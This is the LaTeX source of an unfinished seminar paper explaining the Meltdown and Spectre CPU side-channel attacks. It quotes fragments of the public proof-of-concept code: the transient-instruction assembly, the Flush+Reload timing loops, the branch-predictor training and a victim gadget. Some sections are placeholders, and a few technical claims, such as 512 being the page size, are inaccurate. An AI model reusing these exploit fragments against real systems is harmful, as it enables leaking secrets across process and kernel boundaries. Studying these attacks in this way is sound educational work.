% TEMPLATE FOR SEMINARS
%
% This template serves as a basic style for your seminar paper. Please
% make yourself familiar with LaTeX, BibTeX and this template. Several
% parts of the template need to be adjusted, these places are marked
% with FIXME.
%
% Contact your advisor in case you have questions.

\documentclass[a4paper,oneside,openright] {scrreprt}
\usepackage[T1]{fontenc}
\usepackage[latin1]{inputenc}
\usepackage[pdftex]{graphicx,color}
\usepackage{graphicx}
\usepackage{epsfig}
\usepackage{fancyhdr}
\usepackage{times}
\usepackage{url}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{listings}
%\usepackage{dtklogos}
%\usepackage{blindtext}
\usepackage{tikz}
\usepackage[T1]{fontenc}
%\usepackage{longtable}
%\usepackage{supertabular}
\usepackage{verbatim}
\usepackage{color}
\usepackage{moreverb}       % z.B. \listinginput
\usepackage{float}

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{1.0,1.0,1.0}
 
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2,
    frame={shadowbox},
}
 
\lstset{style=mystyle}
 

\newcommand{\HRule}{\rule{\linewidth}{0.5mm}}

\title{\Huge Meltdown \& Spectre}
\author{\Large Marvin Schirrmacher}

\makeatletter

%*** Commands you may want to use ***
\newtheorem{theorem}{Theorem}[section]
\newtheorem{lemma}[theorem]{Lemma}
\newtheorem{proposition}[theorem]{Proposition}
\newtheorem{corollary}[theorem]{Corollary}
\newtheorem{definition}[theorem]{Definition}
\newtheorem{algorithm}[theorem]{Algorithm}
\newenvironment{example}{\begin{quote}{\bf Example:}}{\end{quote}}

\begin{document}

\input{titlepage}

\pagestyle{plain}
\cleardoublepage
\pagenumbering{roman}
\tableofcontents
\clearpage
\pagenumbering{arabic}

%************************************************************%
%* START WRITING HERE OR PROVIDE SECTIONS IN SEPERATE FILES *%
%************************************************************%

%%%
\chapter{Overview}  
\label{ch:overview}
%%%

Meltdown and Spectre are the result of the most critical vulnerabilities in todays processors 
which threaten the modern world of computing. They allow reading secret data from other processes running on
the same machine and thereby circumventing the protection mechanisms of operating systems.
These exploits put hardware and software companies under pressure for finding short-term as well
as long-term solutions to address arising problems. To avoid debacles quick solutions have been found 
for some of the uncovered exploit techniques, but in the long run the fundamental design of modern 
processors has to be challenged and reconsidered.

\section{Meltdown and Spectre in Brief}
\label{ch:intro:motivation}

Meltdown and Spectre misuse a feature of modern processors which enables fast execution of machine instructions, 
called \textit{out-of-order execution}. This feature allows to force the CPU to execute instructions 
which read secret data from address spaces of other processes or even the kernel address space. 
Even though the processors behave correctly by cleaning or vanishing illegally accessed data, 
they still leave traces which enable to build so called \textit{covert channels} 
and thus leveraging attacks likes Meltdown and Spectre.

\section{Relevance and Practical Impact}
\label{ch:intro:motivation}

Especially the rise of cloud computing accelerates the urgency for solving Meltdown and Spectre related issues.
Companies which run their software in the cloud became vulnerable because the exploit techniques enable attackers
to read private data of customers by running malicious software on the same machines. 

Also applications running on mobile phones or laptops are vulnerable and expose their sensitive data. 
Even browsers can easily be attacked with a short JavaScript implementation of Spectre and thus reveal secret data
like passwords, session keys or cookies from websites. These examples indicate that Meltdown and Spectre are a serious matter which should be dealt with.

This work introduces all basics needed to understand Meltdown and Spectre and also dives deeper into the implementation
to focus on technical details of the exploits. At the end the reader should have a deep understanding of Meltdown and Spectre
and should be able to distinguish their traits and impact on modern computing.

%%%
\chapter{Computer Architecture Basics}
\label{ch:basics}
%%%

This chapter introduces some basics which are needed to understand and create implementations of Meltdown and Spectre. 
All parts of this chapter are presented isolated and not in the context of the exploits. 
Rather their connection and purpose is highlighted in chapters 3 and 4.

\section{Processes, Address Spaces and Caching}
\label{ch:intro:motivation}

Operating systems use processes as an abstraction to handle execution of multiple programs at the same time
 and managing their associated resources like address spaces, registers, list of open files, 
 out-standing alarms and lists of related processes ~\cite{tanenbaum2009modern:39-41}. 
CPU hardware ensures that processes of the operating system, \textit{kernel processes},  and processes of users are protected from each other 
by generating isolated address spaces for each process 
and preventing mutual modification or illegal access of data ~\cite{silberschatz2012operating}.

Every illegal operation of a process trying to circumvent these isolation boundaries results in a 
fatal error, called \textit{trap}, which must be handled by the operating system. Memory separation is realized 
with the help of \textit{virtual address spaces} which are further divided into fixed-size \textit{pages} 
which are mapped into \textit{physical address space} by page tables ~\cite{hennessy2011computer:105-107}. 
A page table knows which process is allowed to access a specific page and thus it serves as
 a restriction mechanism to monitor and control illegal memory access.

The memory of a computer is divided into \textit{cache lines} which can be stored temporarily in the cache to accelerate
access of frequently used memory locations ~\cite{tanenbaum2009modern:24-27}. Because the size of a cache is limited
cache lines have to be evicted over time depending on their frequency of usage resulting in a \textit{cache hit} if a line
is cached, otherwise in a \textit{cache miss}. If a cache miss occurs the processor has to load data from another
cache or from memory which delays data access by a significant amount of time.

\section{Out-of-order Execution}
\label{ch:intro:motivation}

Tomasulo ~\cite{tomasulo1967efficient} created an algorithm which analyses a set or \textit{window} of
program instructions and their relationships to maximize their overlapping capabilities and thus the ability to get parallelized 
without harming essential precedences. This allows processors to reorganize instructions so that their execution is faster 
in comparison to the execution time with the original order.
Succeeding instructions can be executed in parallel if preceding ones
 have to wait for accessing memory in case of a cache miss~\cite{hennessy2011computer:183}.

\section{Branch Prediction}
\label{ch:intro:branch_prediction}

Branch prediction is a feature of processors used to guess the result of a conditional branch in a sequence of program instructions to gain performance boosts~\cite{smith1995microarchitecture}.
So called \textit{branch predictors} analyse static information, e.g. opcode types, or dynamic program information, e.g. the branch history, to predict the result of these conditional branches.
The prediction decides if the instructions following the branch condition should be executed or not.
If the guess is correct performance improvements are gained because following statements can be executed in advance 
while the condition is evaluated.

\section{Transient Instructions}
\label{ch:intro:branch_prediction}

As already mentioned above out-of-order execution reorders program instructions to accelerate CPU performance.
If an instruction is mistakenly executed in advance, e.g. when a branch condition is predicted incorrectly by the branch predictor, 
then the speculatively executed instruction is called a \textit{transient instruction} ~\cite{lipp2018meltdown, kocher2018spectre}.
When the CPU detects that a transient instruction was executed it inverts its effects by dismissing results and resetting the state of affected registers.
We will see in Chapter 3 that modern processors do not remove all traces of such transient instructions and thus enable
Meltdown and Spectre attacks.

This Chapter introduced some fundamentals which are needed for understanding Meltdown and Spectre as well as their 
effects on the architectural state of the CPU and the operating system. The next Chapter will show how these parts
are connected in the context of the exploits.

%%%
\chapter{Meltdown versus Spectre}
\label{ch:contentI}
%%%

The following chapter deals with the common features and differences of Meltdown and Spectre based on the
 original papers ~\cite{lipp2018meltdown, kocher2018spectre}. This chapter highlights why the exploits are related
 and shows how they use different techniques to achieve their goals.
 
 
 \section{Differences in Brief}
 \label{ch:intro:motivation}
 
 Meltdown and Spectre both misuse out-of-order execution and transient instructions as techniques to access memory of 
 other contexts by analyzing side channel information of the CPU's cache. 
  Meltdown enables an attacker to read memory of kernel and user processes
  in contrast to Spectre which just allows to dump memory of sandboxes or other user processes. Spectre affects all modern processors like Intel, AMD, and ARM while Meltdown
 is only exploitable on Intel processors. The challenge of Spectre is that it has to be adapted for specific programs under attack. 
 Meltdown on the other hand is a more general approach with regard to its implementation. The following sections compare Meltdown and Spectre in depth.
 
\section{What Unites Them?}
\label{ch:intro:motivation}

This section deals with the common features of Meltdown and Spectre in detail. 
Both attacks use out-of-order execution and transient instructions to manipulate the cache of a CPU and thereby
creating so called \textit{covert channels} to reveal secret data. Although they apply different techniques, 
as we will see in chapter 3.3, both attacks misuse the design of modern processors
by analyzing traces of \textit{microarchitectural state} changes. 

\subsection{Usage of Transient Instructions}
\label{ch:intro:motivation:A}

When a transient instruction is executed the microarchitectural state of a CPU is altered, e.g. registers are filled with results
of the instruction. When the CPU detects that the speculatively executed instruction should not have been executed it cleans these state
changes as already mentioned. So from the outer architectural view processors behave correctly. 
Despite modern processors do not eliminate all microarchitectural state changes properly so that the execution of a transient instruction
 leaves a persistent trace. In the case of Meltdown and Spectre the cache is altered with speculatively executed instructions resulting
 in a microarchitectural state change which is not vanished by modern CPUs.

 \subsection{Building Covert Channels}
\label{ch:intro:motivation:A}

Side-channel attacks use physical channels like power consumption or timing behavior of programs to
leak secret data. Meltdown and Spectre are side-channel attacks, more precisely \textit{cache attacks}, 
utilizing the timing behavior of the cache ~\cite{osvik2006cache}.

The core idea of the attacks is to execute transient instructions 
which access memory by interweaving the access location with an unknown secret byte from another protected context. 
When the CPU loads the secret byte to dynamically calculate the target access location 
it detects that the instruction is transient and vanishes the secret byte and the result of the final memory location from its state. 
Though the access instruction was executed in advance, before the CPU detects that it is transient, the microarchitectural state
 of the CPU is already altered.
 Since memory locations are cached when being read and the processor does not clean its microarchitectural state properly,
 we just have to detect which memory location has been cached to recreate the secret byte.
 Meltdown and Spectre instrumenting techniques like Flush+Reload ~\cite{yarom2014flush} 
 or Evict+Reload ~\cite{gruss2015cache} to find out the cached memory location depending on the secret byte.
These techniques load many locations from memory and measure how much time the access takes to detect cached lines.

Flush+Reload flushes the cache lines of the attacker's process with intrinsic CPU instructions and reloads a target memory location.
The reloaded and thereby cached location can be detected by measuring the access time which is significantly smaller than the access
time of flushed locations.
Evict+Reload works similarly to Flush+Reload but instead of flushing the cache it accesses many uncached memory
locations so that cached ones are evicted from the cache.
This technique is useful when the flush instruction is not available, e.g. for high level JavaScript implementations of Spectre. 

For both attacks the cache acts as a covert channel making the inner workings of the CPU visible to the outside world. 
The next section explains the details of revealing secret data with the mentioned techniques. 

\subsection{Process of Revealing Secret Data}
\label{ch:intro:motivation:A}

Meltdown and Spectre exploit the execution of transient instructions by accessing bytes of memory contexts 
 which are usually protected by the CPU, the operating system or sandboxes. 

For revealing a secret byte two registers, R1 and R2, must be under control of the attacker. The contents of these registers have to be 
combined with a reversible operation like add, subtract or XOR. Besides an array, the so called \textit{probe array}, has to be 
initialized in the attacker's address space with the size of 256, i.e. byte size, times the size of a memory page. This array will 
reveal secret bytes as explained below.

The transient instructions of Meltdown and Spectre consist of the following steps:
The attacker loads the base address of the probe array into R1 and combines it with a secret byte loaded into R2. 
Then the element of the probe array at the resulting address, e.g. R1+R2, has to be accessed by the malicious instruction sequence.
Thus the secret byte in R2 can be seen as the offset location which points to one of the 256 elements of the probe array.

The next step after executing the transient instruction is to find the element of the probe array which has been cached by the processor
because this must be the accessed element.
A cached element is loaded significantly faster into a register of the CPU than accessed from memory.
If every element of the probe array is checked for being cached by utilizing techniques like Flush+Reload or Evict+Reload it is possible
to reveal the secret byte because it matches the position of the cached element.
This process can be executed iteratively to reveal many secret bytes from protected contexts. Its important to mention that this exploit
applied by Meltdown and Spectre can also be realized with high level languages like JavaScript.

This chapter highlighted the common techniques of Meltdown and Spectre and how they can be used to access protected memory.
The next chapter will focus on the differences of the exploits.

\section{What Divides Them?}
\label{ch:intro:motivation}

This chapter deals with the differences of Meltdown and Spectre. As mentioned above Meltdown enables an attacker 
to dump the memory of kernel and user processes. On the other hand Spectre can just be utilized to read protected memory within 
the same process (sandboxes) or of other user processes.
Adding to this the implementation of Spectre is more specific because it requires adaptation to the attacked process,
 e.g. by analyzing the binaries a program uses. Meltdown is a more general approach with the limitation that it just works on Intel
 processors in contrast to Spectre which is applicable on all modern processors like Intel, AMD, and ARM. Furthermore Meltdown and 
 Spectre use different implementation details regarding the usage of transient instructions. 
 All these details will be examined in the following.

\subsection{Dealing with Exceptions}
\label{ch:intro:motivation:A}

As explained above Meltdown and Spectre try to manipulate the cache with the help of transient instructions. 
When a CPU detects illegal memory access within such instructions a fatal error is raised and the program of the attacker
is terminated. Therefore Meltdown has two concepts of avoiding crashes: \textit{exception handling} and \textit{exception suppression}.

Exception handling is the process of catching raised errors. Meltdown uses signal handlers to catch errors
which are executed in case of a segmentation fault.

Exception suppression is the process of preventing that an error is raised. This can be done by putting the illegal memory access
within a branch condition. The goal is to trick the branch predictor so that the condition is predicted incorrectly and the following
instructions are speculatively executed.
Then errors do not terminate the attacker's process instead the CPU silently vanishes their results
 but still leaves exploitable traces in the cache.
Meltdown misuses the race condition of the CPU between raising the error and cleaning it's microarchitectural state. On Intel TSX processors Meltdown realizes exception suppression by grouping transient instructions which can be
 reversed as a whole after failing.

The Spectre attack does not need to catch segmentation faults because it just tricks the branch predictor to access secret data. 
Hence the exploit is only based on exception suppression.

\subsection{Complexity and Impact}
\label{ch:intro:motivation:A}

Since Meltdown circumvents the raise of segmentation faults it enables the attacker to read secret bytes even from the kernel address space.
Thus Meltdown breaks the isolation of the malicious program and achieves privilege escalation. 
On the other hand Spectre just tries to read legal memory locations. Hence it does not achieve privilege escalation and just can read
protected memory from the same process. 
Despite it can reveal memory of other user processes because the branch predictor can be manipulated in the 
context of the attacker program and at the same time affecting the branch prediction within other contexts, i.e other processes.
So the attacker has to search for \textit{gadgets} within the binaries of the victim program which access data the attacker wants to reveal.
These gadgets should follow a branch condition so that the exploit is applicable.
If the branch predictor is tricked the victim's process will execute the instructions of the gadget which then influence the cache 
and enable the above-mentioned techniques. 
This shows that Spectre is more complex than Meltdown if memory of other processes should be dumped. 
If the attacker wants to read memory of the same process Spectre is as simple as Meltdown because the binaries of the victim program
can be neglected.

The most important difference between Meltdown and Spectre is that the former is only applicable on Intel processors while Spectre 
also affects AMD and ARM processors. The reason for that is not known by the researchers but it might be possible that current 
implementations of Meltdown are not perfectly optimized.

This chapter highlighted the differences between Meltdown and Spectre to get a deeper understanding of the exploits.
Now the foundation for the next chapter is given so that implementations of the attacks can be presented.

%%%
\chapter{Source Code Analysis}
\label{ch:sourceCodeAnalysis}
%%%

This chapter shows example implementations of Meltdown and Spectre created by the researchers of the original papers.
The implementations will highlight how the explained techniques work in detail.

\section{Meltdown Implementation}
\label{ch:intro:motivation}

This section deals with the implementation of Meltdown\footnote{https://github.com/IAIK/meltdown/tree/master/libkdump} applying
Flush+Reload to build a covert channel. Just the core functionality of the implementation is focused and
the building blocks of the exploit are examined gradually.

\subsection{Transient Instruction Sequence}
\label{ch:intro:motivation:A}

\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown]
  #define meltdown\
  asm volatile("1:\n"\
               "movq (%%rsi), %%rsi\n"\
               "movzx (%%rcx), %%rax\n"\
               "shl $12, %%rax\n"\
               "jz 1b\n"\
               "movq (%%rbx,%%rax,1), %%rbx\n"\
               :\
               : "c"(phys), "b"(mem), "S"(0)\
               : "rax");
\end{lstlisting}

\subsection{Dealing with Exceptions}
\label{ch:intro:motivation:A}

\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown]
static void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}
\end{lstlisting}

\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown]
static int __attribute__((always_inline)) flush_reload(void *ptr) {
    uint64_t start = 0, end = 0;
  
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
  
    flush(ptr);
  
    if (end - start < config.cache_miss_threshold) {
      return 1;
    }
    return 0;
}
\end{lstlisting}

\subsection{Covert Channel Creation}
\label{ch:intro:motivation:A}

\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown]
int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
    size_t retries = config.retries + 1;
    uint64_t start = 0, end = 0;
  
    while (retries--) {
      if (!setjmp(buf)) {
        MELTDOWN;
      }
  
      int i;
      for (i = 0; i < 256; i++) {
        if (flush_reload(mem + i * 4096)) {
          if (i >= 1) {
            return i;
          }
        }
        sched_yield();
      }
      sched_yield();
    }
    return 0;
}
\end{lstlisting}

\subsection{Retrieving Secret Bytes}
\label{ch:intro:motivation:A}

XXXXXXXXXXXXXXXXXXXX

\section{Spectre Implementation}
\label{ch:intro:motivation}

This chapter examines an example C++ implementation of Spectre which also applies Flush+Reload and some advanced techniques
to manipulate the branch predictor.

\subsection{Covert Channel}
\label{ch:intro:motivation:A}
 
This section illustrates how Spectre creates a covert channel with Flush+Reload. 
In listing ~\ref{lst:victim} the flush part of the Flush+Reload attack is shown. It utilizes the intrinsic instruction 
\texttt{\_mm\_clflush} ~\cite{intelintrinsics} to clean the probe array \texttt{array2} from the cache. This part resets the cache state
so that time measurements can be conducted afterwards. If Spectre is implemented in high level languages like JavaScript it
might be the case that \texttt{\_mm\_clflush} is not available as a function call. Then other techniques like Evict+Reload have
to be applied.

\begin{lstlisting}[language=C, caption=Spectre: Flush, label={lst:flush}]
for (i = 0; i < 256; i++)
    _mm_clflush(&array2[i * 512]); /* clflush */
}
\end{lstlisting}

The next step is the reload phase where all elements of the probe array are tested for being cached. 
Listing ~\ref{lst:reload} contains the instructions of this phase. Line 3 maps the index value \texttt{i} to pseudorandom numbers
 so that the access of the elements is scattered and not conducted linearly. 
 This is necessary because neighboring pages might be cached if 
accessed linearly which would lead to invalid measurement results. Line 6 contains the actual reload instruction which is wrapped 
by time measurements.
To measure the access time precisely the intrinsic instruction \texttt{\_\_rdtscp} ~\cite{intelintrinsics} is used which
copies the CPU's time-stamp counter. High precision timers are crucial for the attack. For this reason browsers like 
Google Chrome reduced the precision of the \texttt{performance.now()} function to mitigate Spectre attacks ~\cite{chromeSpectreMeltdown}.
To distinguish a cached memory location from an uncached one it is necessary to compute the value \texttt{CACHE\_HIT\_THRESHOLD}.
This value has to be adapted for the CPU and can be calculated by taking the average time of many cache hits.
If the measured access time is smaller or equal to the threshold the index of the related element is considered as a potential result.

\begin{lstlisting}[language=C, caption=Spectre: Reload, label={lst:reload}]
for (i = 0; i < 256; i++)
{
    mix_i = ((i * 167) + 13) & 255;
    addr = &array2[mix_i * 512];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD &&
        mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit -> score +1 for this value */
}
\end{lstlisting}

\subsection{Tricking the Branch Predictor}
\label{ch:intro:motivation:A}

Tricking the branch predictor is the core of the Spectre attack. Listing ~\ref{lst:twiddling} contains instructions which
 set the value of a variable \texttt{x} within a for-loop to confuse the branch predictor.
The variable \texttt{x} represents the access location of an array which is the starting point for malicious memory access.
The idea is to fill \texttt{x} over many iterations with valid locations so that the branch predictor believes
that it's value is within the array bounds. But in some of the iterations \texttt{x} is set to an invalid memory location
which is out of the array bounds where the secret bytes should be read.

\begin{lstlisting}[language=C, caption=Spectre: Branch Predictor Tricking, label={lst:twiddling}]
x = ((j % 6) - 1) & ~0xFFFF;
/* Set x=-1 if j&6=0, else x=0 */
x = (x | (x >> 16));
x = training_x ^ (x & (malicious_x ^ training_x));
    
/* Call the victim! */
victim_function(x);
\end{lstlisting}

Although the instruction sequence seems complicated it just sets the value \texttt{x} to the malicious target location 
\texttt{malicious\_x} in every 6th iteration. In every other iteration \texttt{x} is set to \texttt{training\_x}.
Listing ~\ref{lst:simplified} shows the semantic equivalent which is not applicable for the attack because the compiled code
contains jump instructions which give the branch predictor hints that \texttt{malicious\_x} and also \texttt{x} are invalid.
The compiled instructions of listing ~\ref{lst:twiddling} on the other hand contain no jumps.

\begin{lstlisting}[language=C, caption=Spectre: Branch Predictor Tricking Simplified, label={lst:simplified}]
x = (j % 6 == 0) ? malicious_x : training_x;
\end{lstlisting}

Listing ~\ref{lst:victim} shows an example victim function. The goal is to trick the branch predictor so that the if condition is 
assumed to be true even if the value \texttt{x} is out of the array bounds. The value \texttt{512} indicates the memory page size of the
attacked program which is multiplied by the secret value accessed through \texttt{array1}. So an element of \texttt{array2}, the probe array, is loaded
and thus cached if the instruction in line 5 is executed. Then Flush+Reload has to be applied to identify the cached element
and the secret byte at memory location \texttt{x}.

\begin{lstlisting}[language=C, caption=Spectre: Example Victim Gadget, label={lst:victim}]
void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[array1[x] * 512];
    }
}
\end{lstlisting}

It is also important that the variable \texttt{array1\_size} of listing ~\ref{lst:victim} is flushed from the cache so that out-of-order
execution is triggered when the value has to be loaded from memory due to a cache miss so that the transient instruction within
the branch condition can be executed in advance.

To achieve good measurements with Flush+Reload the Spectre implementation uses 1000 iterations to be sure that the results
are significant. Within these iterations the branch predictor is trained with another 30 iterations leading to a low error rate (<0.01\%).

%%%
\chapter{Countermeasures}
\label{ch:countermeasures}
%%%

XXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX

\section{Meltdown}
\label{ch:intro:motivation}

\section{Spectre}
\label{ch:intro:motivation}


%%%
\chapter{Conclusion}
\label{ch:conclusion}
%%%

XXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX

\lstlistoflistings

\bibliography{literature}
\bibliographystyle{alpha}

\end{document}
